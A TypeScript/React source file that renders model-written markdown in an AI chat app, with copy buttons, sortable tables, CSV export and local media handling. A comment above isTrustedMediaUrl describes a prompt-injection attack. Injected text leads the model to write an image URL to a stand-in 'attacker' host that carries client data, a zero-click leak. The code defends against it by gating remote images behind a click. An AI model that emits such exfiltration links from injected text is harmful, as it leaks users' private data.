"use client";

/**
 * The ONE markdown renderer (v1.230.0, audit U2).
 *
 * Lifted out of app/chat/page.tsx, where it grew up: a session's summary card
 * and a project's "Recent runs" rows used to print the model's markdown RAW
 * (`**Done** — wrote *report.md*` with every asterisk showing) because chat
 * was the only surface that owned a renderer. Every surface that shows a
 * model-written paragraph renders through `Markdown`; a one-line row uses
 * `plainText` instead (no block layout in a truncated line). Chat keeps its
 * behaviour byte-for-byte: the draft fence → DraftCard path, the copy button
 * on code blocks, the local-media rewrite through /creative/file-by-path.
 */

import {
  Children,
  cloneElement,
  createContext,
  isValidElement,
  memo,
  useContext,
  useEffect,
  useRef,
  useState,
  type ReactElement,
  type ReactNode,
} from "react";
import { ArrowDown, ArrowUp, ArrowUpDown, Check, Copy, Download } from "lucide-react";
import ReactMarkdown, { defaultUrlTransform, type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { API_BASE, ijToken } from "@/lib/api";
import { DraftCard, draftFromFence, fenceLang } from "@/components/chat/DraftCard";
import { ChartCard } from "@/components/chat/ChartCard";
import { CHART_FENCE, parseChartSpec } from "@/lib/chartSpec";
import { nextSort, rowsToCsv, sortOrder, type SortDir, type SortState } from "@/lib/tableData";

/** Collect the plain text inside rendered markdown children (for copy buttons). */
export function nodeText(node: ReactNode): string {
  if (node === null || node === undefined || typeof node === "boolean") return "";
  if (
    typeof node === "string" ||
    typeof node === "number" ||
    typeof node === "bigint"
  ) {
    return String(node);
  }
  if (Array.isArray(node)) return node.map(nodeText).join("");
  if (isValidElement(node)) {
    return nodeText((node as ReactElement<{ children?: ReactNode }>).props.children);
  }
  return "";
}

/**
 * Markdown → one line of plain text, for a row that truncates. Strips the
 * markers a model writes (emphasis, headings, list bullets, links, inline
 * code, fences) and collapses whitespace; the words stay. Snake_case
 * identifiers keep their underscores (only word-bounded `_x_` is emphasis).
 */
export function plainText(md: string): string {
  return (md || "")
    .replace(/```[^\n]*\n?/g, "") // fence markers (the code inside stays)
    .replace(/!\[([^\]]*)\]\([^)]*\)/g, "$1") // images → alt
    .replace(/\[([^\]]+)\]\([^)]*\)/g, "$1") // links → text
    .replace(/^\s{0,3}#{1,6}\s+/gm, "") // headings
    .replace(/^\s{0,3}>\s?/gm, "") // blockquotes
    .replace(/^\s*(?:[-*+]|\d+[.)])\s+/gm, "") // list bullets
    .replace(/(\*\*|__)(?=\S)([\s\S]+?)(?<=\S)\1/g, "$2") // bold
    .replace(/\*(?=\S)([^*]+?)(?<=\S)\*/g, "$1") // *italic*
    .replace(/(?<![\w])_(?=\S)([^_]+?)(?<=\S)_(?![\w])/g, "$1") // _italic_
    .replace(/~~(.+?)~~/g, "$1") // strikethrough
    .replace(/`([^`]+)`/g, "$1") // inline code
    .replace(/\s+/g, " ")
    .trim();
}

/** Small clipboard button: copies `text`, flashes a check for a moment. */
export function CopyIconButton({
  text,
  title,
  className,
}: {
  text: string;
  title: string;
  className?: string;
}) {
  const [copied, setCopied] = useState(false);
  const timerRef = useRef<number | null>(null);
  useEffect(
    () => () => {
      if (timerRef.current !== null) window.clearTimeout(timerRef.current);
    },
    [],
  );
  function copy() {
    navigator.clipboard
      .writeText(text)
      .then(() => {
        setCopied(true);
        if (timerRef.current !== null) window.clearTimeout(timerRef.current);
        timerRef.current = window.setTimeout(() => setCopied(false), 1500);
      })
      .catch(() => {
        /* clipboard unavailable — nothing useful to surface */
      });
  }
  return (
    <button
      type="button"
      onClick={copy}
      title={title}
      aria-label={title}
      className={
        className ??
        "grid h-6 w-6 place-items-center rounded-md text-zinc-500 transition-colors hover:bg-white/[0.06] hover:text-zinc-200"
      }
    >
      {copied ? <Check size={12} className="text-emerald-400" /> : <Copy size={12} />}
    </button>
  );
}

// Lets the <code> override know it sits inside a <pre> block (block code keeps
// the pre's styling; standalone inline code gets the accent pill).
const PreContext = createContext(false);

/** Fenced code block: dark panel + hover copy button — unless the fence is a
 *  draft, which becomes a boxed, rich-copyable card instead. */
function MarkdownPre({ children }: { children?: ReactNode }) {
  const text = nodeText(children).replace(/\n$/, "");
  // The fence's CONTENT is markdown, not code: the model writes **bold** and
  // bullet lists in a draft, and a fence stops the outer pass from parsing
  // them. Parsing it here is what makes the copied HTML carry real formatting
  // instead of literal asterisks. All of the decision-making lives in
  // draftFromFence so this call site and the tests share one implementation.
  const draft = draftFromFence(children, text);
  if (draft) {
    return (
      <DraftCard subject={draft.subject} text={draft.text}>
        <Markdown content={draft.markdown} />
      </DraftCard>
    );
  }
  // v1.325.0: a ```chart fence whose JSON parses is drawn as a chart. One that
  // does not parse — or is still streaming, so its JSON is half-written —
  // falls through to the ordinary code block below, where the user can still
  // read exactly what the model wrote.
  if (fenceLang(children) === CHART_FENCE) {
    const spec = parseChartSpec(text);
    if (spec) return <ChartCard spec={spec} />;
  }
  return (
    <div className="group/code relative my-2">
      <CopyIconButton
        text={text}
        title="Copy code"
        className="absolute right-2 top-2 z-10 grid h-6 w-6 place-items-center rounded-md border border-white/10 bg-white/[0.06] text-zinc-400 opacity-0 transition-opacity hover:text-zinc-100 focus-visible:opacity-100 group-hover/code:opacity-100"
      />
      <PreContext.Provider value={true}>
        <pre className="overflow-x-auto rounded border border-white/[0.06] bg-ink-900/80 p-3 font-mono text-xs leading-relaxed text-zinc-200">
          {children}
        </pre>
      </PreContext.Provider>
    </div>
  );
}

function MarkdownCode({
  className,
  children,
}: {
  className?: string;
  children?: ReactNode;
}) {
  const inPre = useContext(PreContext);
  if (inPre) return <code className={className}>{children}</code>;
  return (
    <code className="rounded bg-white/[0.08] px-1.5 py-0.5 font-mono text-[0.85em] text-accent-soft">
      {children}
    </code>
  );
}

/** Media extensions the daemon's /creative/file-by-path endpoint will serve.
 *  Keep in sync with creative/service.py IMAGE/VIDEO/AUDIO_EXTS. */
const MEDIA_EXT_RX =
  /\.(png|jpe?g|webp|gif|bmp|svg|mp4|webm|mov|m4v|avi|mkv|mp3|wav|ogg|m4a|flac|aac|opus)$/i;
const VIDEO_EXT_RX = /\.(mp4|webm|mov|m4v|avi|mkv)$/i;
const AUDIO_EXT_RX = /\.(mp3|wav|ogg|m4a|flac|aac|opus)$/i;

/**
 * Inline media in replies — the "show me" half of the creative loop. The pixio
 * tools save generations to LOCAL paths and tell the model to embed them as
 * markdown images; a browser can't load `C:\…\pixio\out.png` directly, so
 * local absolute paths are rewritten through the daemon's guarded
 * /creative/file-by-path (media extensions only; ?token= because <img> can't
 * send an Authorization header). Video/audio extensions get real players.
 */
/**
 * WHERE AN IMAGE MAY LOAD FROM WITHOUT A CLICK (borrowed idea: assistant-ui's
 * hardened markdown, v1.322.0). A reply is model-written, and the model reads
 * web pages and documents someone else wrote: injected text can make it write
 * `![](https://attacker/?q=<client data>)`, and rendering that `<img>` sends
 * the request — a zero-click leak on a box that holds client documents. So an
 * image loads by itself only from this PC (a local path, rewritten through the
 * daemon), the daemon's own origin, or an inline `data:image`. Anything else
 * waits for a press that names the host it would load from.
 */
export function isTrustedMediaUrl(src: string): boolean {
  const raw = (src || "").trim();
  if (!raw) return false;
  if (/^data:image\/(png|jpe?g|gif|webp|avif|bmp);/i.test(raw)) return true;
  if (/^([A-Za-z]:[\\/]|\/(?!\/))/.test(raw) || raw.startsWith("file://")) return true;
  try {
    const u = new URL(raw);
    const base = new URL(API_BASE || "http://127.0.0.1:8787");
    return u.origin === base.origin;
  } catch {
    return false;
  }
}

function RemoteMediaGate({ src, children }: { src: string; children: ReactNode }) {
  const [allowed, setAllowed] = useState(false);
  if (allowed) return <>{children}</>;
  let host = src;
  try {
    host = new URL(src).host || src;
  } catch {
    /* not a URL: show it as written */
  }
  return (
    <button
      type="button"
      data-testid="remote-media-gate"
      onClick={() => setAllowed(true)}
      title={src}
      className="my-2 inline-flex max-w-full items-center gap-2 rounded-xl border border-white/10 bg-white/[0.03] px-3 py-2 text-left text-[12px] text-zinc-300 hover:border-white/20"
    >
      <span className="truncate">
        Load image from <span className="font-mono text-zinc-100">{host}</span>?
      </span>
    </button>
  );
}

/**
 * v1.322.0: react-markdown's default URL filter treats `C:` as an unsafe
 * scheme and blanks it, so an image the pixio tools saved to a Windows path
 * (`![out](C:\…\out.png)`) never displayed. An IMAGE source that is a
 * drive path is kept (MarkdownMedia then routes it through the daemon's
 * guarded media route); every other URL — and every link — still goes through
 * the default filter.
 */
export function mediaUrlTransform(url: string, key: string): string {
  // The parser percent-encodes a backslash (`C:%5CUsers…`): decode a drive
  // path back to what the model wrote before the media component reads it.
  if (key === "src" && /^[A-Za-z]:([\\/]|%5[Cc])/.test(url)) {
    try {
      return decodeURIComponent(url);
    } catch {
      return url;
    }
  }
  return defaultUrlTransform(url);
}

function MarkdownMedia({ src, alt }: { src?: string | Blob; alt?: string }) {
  const raw = typeof src === "string" ? src : "";
  if (!raw) return null;
  if (!isTrustedMediaUrl(raw)) {
    return (
      <RemoteMediaGate src={raw}>
        <MarkdownMediaInner raw={raw} alt={alt} />
      </RemoteMediaGate>
    );
  }
  return <MarkdownMediaInner raw={raw} alt={alt} />;
}

function MarkdownMediaInner({ raw, alt }: { raw: string; alt?: string }) {
  const isLocal = /^([A-Za-z]:[\\/]|\/(?!\/))/.test(raw) || raw.startsWith("file://");
  let resolved = raw;
  if (isLocal) {
    const path = raw.replace(/^file:\/\//, "");
    if (!MEDIA_EXT_RX.test(path)) {
      return <code className="text-[12px] text-zinc-400">{raw}</code>;
    }
    const token = ijToken();
    resolved = `${API_BASE}/creative/file-by-path?path=${encodeURIComponent(path)}${
      token ? `&token=${encodeURIComponent(token)}` : ""
    }`;
  }
  if (VIDEO_EXT_RX.test(raw)) {
    return (
      <video
        src={resolved}
        controls
        preload="metadata"
        className="my-2 max-h-96 w-full max-w-xl rounded-xl border border-white/10"
      />
    );
  }
  if (AUDIO_EXT_RX.test(raw)) {
    return <audio src={resolved} controls className="my-2 w-full max-w-xl" />;
  }
  return (
    // eslint-disable-next-line @next/next/no-img-element
    <img
      src={resolved}
      alt={alt || "generated media"}
      loading="lazy"
      className="my-2 max-h-96 w-auto max-w-full rounded-xl border border-white/10"
    />
  );
}

/**
 * TABLE TOOLS (v1.325.0). Every markdown table gets quiet tools on hover or
 * focus — Copy as CSV, Download CSV — and a header press sorts its column
 * (asc → desc → original; numbers by value, "$1,234.50" / "12%" / "(300)"
 * included; blanks last). The pure parts live in `lib/tableData.ts`.
 *
 * Sorting REORDERS THE ROW ELEMENTS react-markdown built (each keeps its key,
 * so React moves the DOM rows rather than rebuilding them) — never a
 * flattened copy, so a bold cell or a link in a cell survives a sort.
 *
 * Every control here is a <button>: `DraftCard.cleanHtml` drops buttons when
 * a draft is copied as rich text, so a table inside an email draft pastes
 * without the tools or the sort arrow. The header's TEXT therefore sits
 * OUTSIDE the button (a click anywhere on the header sorts); the button holds
 * only the arrow and is the keyboard route.
 */
function cellsOf(row: ReactElement): ReactElement<{ children?: ReactNode }>[] {
  const kids = (row.props as { children?: ReactNode }).children;
  return Children.toArray(kids).filter(isValidElement) as ReactElement<{ children?: ReactNode }>[];
}

function downloadCsv(csv: string, name = "table.csv") {
  try {
    // A BOM so Excel reads the file as UTF-8 (without it, accents garble).
    const url = URL.createObjectURL(new Blob(["﻿", csv], { type: "text/csv;charset=utf-8" }));
    const a = document.createElement("a");
    a.href = url;
    a.download = name;
    document.body.appendChild(a);
    a.click();
    a.remove();
    window.setTimeout(() => URL.revokeObjectURL(url), 0);
  } catch {
    /* no Blob URLs here — nothing useful to surface */
  }
}

const TOOL_BTN =
  "inline-flex h-6 items-center gap-1 rounded px-1.5 text-[11px] text-zinc-400 transition-colors hover:bg-white/[0.06] hover:text-zinc-100";

function TableCopyButton({ getText }: { getText: () => string }) {
  const [state, setState] = useState<"idle" | "copied" | "failed">("idle");
  const timerRef = useRef<number | null>(null);
  useEffect(
    () => () => {
      if (timerRef.current !== null) window.clearTimeout(timerRef.current);
    },
    [],
  );
  function done(next: "copied" | "failed") {
    setState(next);
    if (timerRef.current !== null) window.clearTimeout(timerRef.current);
    timerRef.current = window.setTimeout(() => setState("idle"), 1500);
  }
  function copy() {
    try {
      navigator.clipboard.writeText(getText()).then(
        () => done("copied"),
        () => done("failed"),
      );
    } catch {
      done("failed");
    }
  }
  return (
    <button type="button" onClick={copy} className={TOOL_BTN} title="Copy the table as CSV (paste into a spreadsheet)">
      {state === "copied" ? <Check size={11} aria-hidden className="text-tone-success" /> : <Copy size={11} aria-hidden />}
      {state === "copied" ? "Copied" : state === "failed" ? "Couldn't copy" : "Copy as CSV"}
    </button>
  );
}

function MarkdownTable({ children }: { children?: ReactNode }) {
  const [sort, setSort] = useState<SortState | null>(null);
  const parts = Children.toArray(children).filter(isValidElement) as ReactElement<{ children?: ReactNode }>[];
  const thead = parts.find((p) => p.type === "thead");
  const tbody = parts.find((p) => p.type === "tbody");
  const headRow = thead
    ? (Children.toArray(thead.props.children).filter(isValidElement)[0] as ReactElement | undefined)
    : undefined;
  const headCells = headRow ? cellsOf(headRow) : [];
  const bodyRows = tbody
    ? (Children.toArray(tbody.props.children).filter(isValidElement) as ReactElement[])
    : [];
  const sortable = bodyRows.length > 1 && headCells.length > 0;
  const active = sortable ? sort : null;
  const order = active
    ? sortOrder(
        bodyRows.map((tr) => nodeText(cellsOf(tr)[active.col]?.props.children ?? null)),
        active.dir,
      )
    : bodyRows.map((_, i) => i);
  const rows = order.map((i) => bodyRows[i]);

  const csv = () =>
    rowsToCsv([
      headCells.map((th) => nodeText(th.props.children).trim()),
      ...rows.map((tr) => cellsOf(tr).map((td) => nodeText(td.props.children).trim())),
    ]);

  const head =
    thead && headRow
      ? cloneElement(
          thead,
          undefined,
          cloneElement(
            headRow,
            undefined,
            headCells.map((th, col) =>
              cloneElement(th as ReactElement<MarkdownThProps>, {
                sortDir: !sortable ? undefined : active?.col === col ? active.dir : null,
                onSort: sortable ? () => setSort((s) => nextSort(s, col)) : undefined,
              }),
            ),
          ),
        )
      : thead;
  const body = tbody ? cloneElement(tbody, undefined, rows) : null;
  const rest = parts.filter((p) => p !== thead && p !== tbody);

  return (
    <div className="group/table relative my-2" data-testid="md-table">
      <div
        data-testid="table-tools"
        className="absolute right-1 top-1 z-10 flex gap-0.5 rounded-md border border-white/10 bg-ink-900/95 p-0.5 opacity-0 transition-opacity focus-within:opacity-100 group-hover/table:opacity-100 [@media(hover:none)]:static [@media(hover:none)]:mb-1 [@media(hover:none)]:ml-auto [@media(hover:none)]:w-fit [@media(hover:none)]:opacity-100"
      >
        <TableCopyButton getText={csv} />
        <button
          type="button"
          className={TOOL_BTN}
          onClick={() => downloadCsv(csv())}
          title="Download the table as table.csv"
        >
          <Download size={11} aria-hidden />
          Download CSV
        </button>
      </div>
      <div className="overflow-x-auto">
        <table className="w-full border-collapse text-[13px]">
          {head}
          {body}
          {rest}
        </table>
      </div>
    </div>
  );
}

interface MarkdownThProps {
  children?: ReactNode;
  /** undefined = not sortable; null = sortable, not sorted; else the order. */
  sortDir?: SortDir | null;
  onSort?: () => void;
}

function MarkdownTh({ children, sortDir, onSort }: MarkdownThProps) {
  const base =
    "border border-white/10 bg-white/[0.05] px-2.5 py-1.5 text-left font-medium text-zinc-100";
  if (!onSort) return <th className={base}>{children}</th>;
  const name = nodeText(children).trim() || "this column";
  const next =
    sortDir === "asc" ? "descending" : sortDir === "desc" ? "the original order" : "ascending";
  const Icon = sortDir === "asc" ? ArrowUp : sortDir === "desc" ? ArrowDown : ArrowUpDown;
  return (
    <th
      className={`${base} group/th cursor-pointer select-none hover:bg-white/[0.08]`}
      aria-sort={sortDir === "asc" ? "ascending" : sortDir === "desc" ? "descending" : "none"}
      onClick={onSort}
    >
      <span className="inline-flex items-center gap-1">
        <span>{children}</span>
        <button
          type="button"
          aria-label={`Sort by ${name}: ${next}`}
          title={`Sort by ${name}`}
          onClick={(e) => {
            e.stopPropagation();
            onSort();
          }}
          className={`grid h-4 w-4 shrink-0 place-items-center rounded transition-opacity hover:text-zinc-100 focus-visible:opacity-100 ${
            sortDir ? "text-accent-soft opacity-100" : "text-zinc-500 opacity-40 group-hover/th:opacity-100"
          }`}
        >
          <Icon size={11} aria-hidden />
        </button>
      </span>
    </th>
  );
}

// Explicit dark-theme element overrides (the app has no typography plugin, so
// this is our "prose-invert").
const MD_COMPONENTS: Components = {
  h1: ({ children }) => (
    <h1 className="mb-1.5 mt-3 text-base font-semibold text-zinc-100 first:mt-0">
      {children}
    </h1>
  ),
  h2: ({ children }) => (
    <h2 className="mb-1.5 mt-3 text-[15px] font-semibold text-zinc-100 first:mt-0">
      {children}
    </h2>
  ),
  h3: ({ children }) => (
    <h3 className="mb-1 mt-2.5 text-sm font-semibold text-zinc-100 first:mt-0">
      {children}
    </h3>
  ),
  p: ({ children }) => (
    <p className="my-1.5 leading-relaxed first:mt-0 last:mb-0">{children}</p>
  ),
  ul: ({ children }) => (
    <ul className="my-1.5 list-disc space-y-1 pl-5">{children}</ul>
  ),
  ol: ({ children }) => (
    <ol className="my-1.5 list-decimal space-y-1 pl-5">{children}</ol>
  ),
  li: ({ children }) => <li className="leading-relaxed [&>p]:my-0">{children}</li>,
  table: MarkdownTable,
  th: MarkdownTh as Components["th"],
  td: ({ children }) => (
    <td className="border border-white/10 px-2.5 py-1.5 align-top text-zinc-300">
      {children}
    </td>
  ),
  a: ({ children, href }) => (
    <a
      href={href}
      target="_blank"
      rel="noreferrer"
      className="text-accent-soft underline decoration-accent/40 underline-offset-2 transition-colors hover:decoration-accent"
    >
      {children}
    </a>
  ),
  blockquote: ({ children }) => (
    <blockquote className="my-2 border-l-2 border-accent/40 pl-3 text-zinc-400 [&>p]:my-0.5">
      {children}
    </blockquote>
  ),
  hr: () => <hr className="my-3 border-white/10" />,
  strong: ({ children }) => (
    <strong className="font-semibold text-zinc-100">{children}</strong>
  ),
  pre: MarkdownPre,
  code: MarkdownCode,
  img: MarkdownMedia,
};

const REMARK_PLUGINS = [remarkGfm];

export function Markdown({ content }: { content: string }) {
  return (
    <ReactMarkdown remarkPlugins={REMARK_PLUGINS} components={MD_COMPONENTS} urlTransform={mediaUrlTransform}>
      {content}
    </ReactMarkdown>
  );
}

/** Markdown for a SETTLED assistant message, memoized on its content. During a
 *  streaming turn the page re-renders on every token; without this, every prior
 *  assistant bubble would re-run the full remark/rehype parse each token (cost
 *  O(thread size) per token). A prior message's `content` string is referentially
 *  stable, so memo skips the re-parse and streaming stays smooth on long threads. */
export const MemoMarkdown = memo(function MemoMarkdown({ content }: { content: string }) {
  return <Markdown content={content} />;
});
